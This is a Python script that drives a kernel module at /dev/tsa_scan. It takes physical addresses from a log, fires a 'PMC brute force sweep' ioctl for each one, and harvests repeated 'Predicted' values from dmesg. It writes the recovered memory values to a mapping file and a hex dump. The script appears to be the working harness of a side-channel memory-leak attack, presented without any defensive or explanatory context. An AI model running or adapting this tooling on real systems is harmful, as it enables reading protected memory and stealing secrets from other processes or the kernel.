#!/usr/bin/env python3

import argparse
import collections
import ctypes
import os
import re
import subprocess
import sys
import time
from pathlib import Path


# ----------------------------------------------------------------------
# Linux ioctl helpers
# ----------------------------------------------------------------------

_IOC_NRBITS = 8
_IOC_TYPEBITS = 8
_IOC_SIZEBITS = 14
_IOC_DIRBITS = 2

_IOC_NRSHIFT = 0
_IOC_TYPESHIFT = _IOC_NRSHIFT + _IOC_NRBITS
_IOC_SIZESHIFT = _IOC_TYPESHIFT + _IOC_TYPEBITS
_IOC_DIRSHIFT = _IOC_SIZESHIFT + _IOC_SIZEBITS

_IOC_NONE = 0
_IOC_WRITE = 1
_IOC_READ = 2


def _IOC(direction, type_, nr, size):
    return (
        (direction << _IOC_DIRSHIFT)
        | (type_ << _IOC_TYPESHIFT)
        | (nr << _IOC_NRSHIFT)
        | (size << _IOC_SIZESHIFT)
    )


def _IOC_TYPECHECK(t):
    return ctypes.sizeof(t)


def _IOW(type_, nr, argtype):
    return _IOC(_IOC_WRITE, type_, nr, _IOC_TYPECHECK(argtype))


class TsaScanArgs(ctypes.Structure):
    _fields_ = [
        ("phys_base", ctypes.c_uint64),
        ("page_offset_cached", ctypes.c_uint64),
    ]


TSA_IOCTL_MAGIC = ord("T")
TSA_IOCTL_START = _IOW(TSA_IOCTL_MAGIC, 0x01, TsaScanArgs)

libc = ctypes.CDLL(None, use_errno=True)
_ioctl = libc.ioctl
_ioctl.argtypes = [ctypes.c_int, ctypes.c_ulong, ctypes.c_void_p]
_ioctl.restype = ctypes.c_int


def ioctl_start_scan(fd: int, phys_base: int, page_offset_cached: int) -> None:
    args = TsaScanArgs(
        phys_base=phys_base,
        page_offset_cached=page_offset_cached,
    )

    rc = _ioctl(fd, TSA_IOCTL_START, ctypes.byref(args))
    if rc < 0:
        e = ctypes.get_errno()
        raise OSError(e, f"ioctl(TSA_IOCTL_START) failed: {os.strerror(e)}")


# ----------------------------------------------------------------------
# Parsing
# ----------------------------------------------------------------------

STORE_RE = re.compile(
    r"\[\s*store32\s*\]\s+"
    r"(0x[0-9a-fA-F]+)"
    r"\s+\(v=0x0+\)"
)

PRED_RE = re.compile(r"\[\+\]\s+Predicted:\s+(0x[0-9a-fA-F]+)")
DONE_MARKER = "[+] PMC Brute Force Sweep Complete."


def parse_patch_mappings_ordered(path: Path):
    """
    Preserve address order as seen in patch_mappings.log.

    For each store32 with v=0:
        addr + 0x00
        addr + 0x08
        addr + 0x10
        addr + 0x18

    Duplicate expanded addresses are skipped after first occurrence.
    """
    out = []
    seen = set()

    with path.open("r", errors="replace") as f:
        for line in f:
            m = STORE_RE.search(line)
            if not m:
                continue

            base = int(m.group(1), 16)

            for off in range(0, 32, 8):
                addr = base + off
                if addr not in seen:
                    seen.add(addr)
                    out.append(addr)

    return out


def page_base_and_offset(addr: int):
    return addr & ~0xFFF, addr & 0xFFF


# ----------------------------------------------------------------------
# Module loading
# ----------------------------------------------------------------------

def ensure_module_loaded(make_cmd):
    subprocess.run(["sudo", "-v"], check=True)
    print("[+] Loading module via:", " ".join(make_cmd))
    subprocess.run(make_cmd, check=True)


# ----------------------------------------------------------------------
# dmesg collection
# ----------------------------------------------------------------------

def choose_prediction(predictions, min_repeats: int):
    """
    Selection logic:
      - only candidates with count >= min_repeats are valid
      - choose candidate with highest count
      - if multiple candidates tie for highest count, fail
    """
    if not predictions:
        return None, "no predictions"

    counts = collections.Counter(predictions)

    valid = [(val, cnt) for val, cnt in counts.items() if cnt >= min_repeats]

    if not valid:
        return None, f"no candidate repeated >= {min_repeats}"

    valid.sort(key=lambda x: x[1], reverse=True)

    best_val, best_cnt = valid[0]

    tied = [(val, cnt) for val, cnt in valid if cnt == best_cnt]
    if len(tied) > 1:
        tied_s = ", ".join(f"0x{v:016x}:count={c}" for v, c in tied)
        return None, f"tie between candidates: {tied_s}"

    return best_val, None


def collect_scan_result(
    fd: int,
    phys_base: int,
    page_offset_cached: int,
    min_repeats: int,
    timeout_sec: float | None,
    verbose: bool,
):
    """
    Start dmesg --follow-new, fire ioctl, wait for sweep-complete marker.

    Returns:
        value_or_none, predictions, reason_or_none
    """
    dmesg_proc = subprocess.Popen(
        ["sudo", "dmesg", "--follow-new"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
    )

    predictions = []
    start = time.time()

    try:
        # Give dmesg --follow-new a moment to attach before ioctl starts printing.
        time.sleep(0.15)

        ioctl_start_scan(fd, phys_base, page_offset_cached)

        while True:
            if timeout_sec is not None and time.time() - start > timeout_sec:
                return None, predictions, "timeout"

            line = dmesg_proc.stdout.readline()
            if not line:
                if dmesg_proc.poll() is not None:
                    return None, predictions, "dmesg exited"
                time.sleep(0.05)
                continue

            line = line.rstrip("\n")

            if verbose:
                print(line)

            m = PRED_RE.search(line)
            if m:
                predictions.append(int(m.group(1), 16))

            if DONE_MARKER in line:
                break

    except OSError as e:
        return None, predictions, str(e)

    finally:
        if dmesg_proc.poll() is None:
            dmesg_proc.terminate()
            try:
                dmesg_proc.wait(timeout=2)
            except subprocess.TimeoutExpired:
                dmesg_proc.kill()

    value, reason = choose_prediction(predictions, min_repeats)
    return value, predictions, reason


def scan_one_address(
    fd: int,
    addr: int,
    min_repeats: int,
    timeout_sec: float | None,
    verbose: bool,
):
    phys_base, page_offset = page_base_and_offset(addr)

    print(
        f"    scanning: "
        f"PHYS_BASE=0x{phys_base:016x} "
        f"PAGE_OFFSET_CACHED=0x{page_offset:x}"
    )

    value, predictions, reason = collect_scan_result(
        fd=fd,
        phys_base=phys_base,
        page_offset_cached=page_offset,
        min_repeats=min_repeats,
        timeout_sec=timeout_sec,
        verbose=verbose,
    )

    if value is None:
        print(f"    [-] failed: {reason}; using 0x0000000000000000")

        if predictions:
            top = collections.Counter(predictions).most_common(5)
            for val, cnt in top:
                print(f"        candidate 0x{val:016x} count={cnt}")

        return 0, reason, predictions

    return value, None, predictions


# ----------------------------------------------------------------------
# Output
# ----------------------------------------------------------------------

def write_precise_mapping(path: Path, ordered_addresses, mapping, fail_reasons):
    """
    Writes only addresses that have already been scanned.

    Failed scans are written as zero, with reason as comment.
    """
    with path.open("w") as f:
        for addr in ordered_addresses:
            if addr not in mapping:
                continue

            val = mapping[addr]
            reason = fail_reasons.get(addr)

            if reason:
                f.write(f"0x{addr:016x} : 0x{val:016x} ; failed: {reason}\n")
            else:
                f.write(f"0x{addr:016x} : 0x{val:016x}\n")


def write_value_dump(path: Path, ordered_addresses, mapping):
    """
    Dump bytes for scanned addresses.

    Each 64-bit value is emitted little-endian:
        addr + 0 = low byte
        addr + 7 = high byte

    Failed reads are represented as zero because mapping[addr] = 0.
    """
    byte_map = {}

    for addr in ordered_addresses:
        if addr not in mapping:
            continue

        val = mapping[addr]
        b = val.to_bytes(8, byteorder="little", signed=False)

        for i, x in enumerate(b):
            byte_map[addr + i] = x

    if not byte_map:
        path.write_text("")
        return

    sorted_addrs = sorted(byte_map)

    runs = []
    cur = [sorted_addrs[0]]

    for a in sorted_addrs[1:]:
        if a == cur[-1] + 1:
            cur.append(a)
        else:
            runs.append(cur)
            cur = [a]

    runs.append(cur)

    with path.open("w") as f:
        for run in runs:
            line_addr = run[0]
            end = run[-1]

            while line_addr <= end:
                chunk = list(range(line_addr, min(line_addr + 16, end + 1)))

                hex_bytes = []
                ascii_part = ""

                for a in chunk:
                    if a in byte_map:
                        x = byte_map[a]
                        hex_bytes.append(f"{x:02x}")
                        ascii_part += chr(x) if 32 <= x <= 126 else "."
                    else:
                        hex_bytes.append("??")
                        ascii_part += "."

                hex_bytes += ["  "] * (16 - len(hex_bytes))

                f.write(
                    f"0x{line_addr:016x}: "
                    f"{' '.join(hex_bytes)}  |{ascii_part}|\n"
                )

                line_addr += 16

            f.write("\n")


# ----------------------------------------------------------------------
# Main
# ----------------------------------------------------------------------

def main():
    ap = argparse.ArgumentParser()

    ap.add_argument(
        "patch_mappings",
        nargs="?",
        default="patch_mappings.log",
        help="Input patch_mappings.log",
    )

    ap.add_argument(
        "--device",
        default="/dev/tsa_scan",
        help="ioctl misc device",
    )

    ap.add_argument(
        "--make-cmd",
        nargs="+",
        default=["sudo", "make", "insmod-scan"],
        help="Command used once at startup to load the module",
    )

    ap.add_argument(
        "--no-load",
        action="store_true",
        help="Do not run --make-cmd; assume module is already loaded",
    )

    ap.add_argument(
        "--min-repeats",
        type=int,
        default=5,
        help="Minimum repeated identical predictions required",
    )

    ap.add_argument(
        "--timeout",
        type=float,
        default=None,
        help="Optional timeout per address in seconds",
    )

    ap.add_argument(
        "--precise-out",
        default="precise_mapping.txt",
        help="Output address:value mapping",
    )

    ap.add_argument(
        "--dump-out",
        default="value_dump.txt",
        help="Output byte dump",
    )

    ap.add_argument(
        "--dry-run",
        action="store_true",
        help="Only parse and print addresses; do not ioctl",
    )

    ap.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        help="Print followed dmesg lines",
    )

    args = ap.parse_args()

    patch_path = Path(args.patch_mappings)

    if not patch_path.exists():
        print(f"ERROR: missing {patch_path}", file=sys.stderr)
        return 1

    addresses = parse_patch_mappings_ordered(patch_path)

    if not addresses:
        print("ERROR: found no store32 v=0x0 addresses", file=sys.stderr)
        return 1

    print(f"[+] Parsed {len(addresses)} ordered 8-byte addresses")

    if args.dry_run:
        for addr in addresses:
            page, off = page_base_and_offset(addr)
            print(
                f"addr=0x{addr:016x} "
                f"PHYS_BASE=0x{page:016x} "
                f"PAGE_OFFSET_CACHED=0x{off:x}"
            )
        return 0

    if not args.no_load:
        ensure_module_loaded(args.make_cmd)
    else:
        subprocess.run(["sudo", "-v"], check=True)

    if not os.path.exists(args.device):
        print(f"ERROR: device {args.device} does not exist", file=sys.stderr)
        print("Check that misc_register succeeded and module created /dev/tsa_scan.", file=sys.stderr)
        return 1

    results = {}
    fail_reasons = {}

    total = len(addresses)

    fd = os.open(args.device, os.O_RDWR)

    try:
        for idx, addr in enumerate(addresses, 1):
            print(f"\n[{idx}/{total}] scanning 0x{addr:016x}")

            value, reason, predictions = scan_one_address(
                fd=fd,
                addr=addr,
                min_repeats=args.min_repeats,
                timeout_sec=args.timeout,
                verbose=args.verbose,
            )

            results[addr] = value

            if reason:
                fail_reasons[addr] = reason
                print(f"[!] 0x{addr:016x} failed; stored 0x0000000000000000")
            else:
                print(f"[+] 0x{addr:016x} : 0x{value:016x}")

            # Incremental output so partial progress is preserved.
            write_precise_mapping(Path(args.precise_out), addresses, results, fail_reasons)
            write_value_dump(Path(args.dump_out), addresses, results)

            # Small guard to avoid immediately overlapping with late kernel prints.
            time.sleep(0.2)

    finally:
        os.close(fd)

    print(f"\n[+] Wrote {args.precise_out}")
    print(f"[+] Wrote {args.dump_out}")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())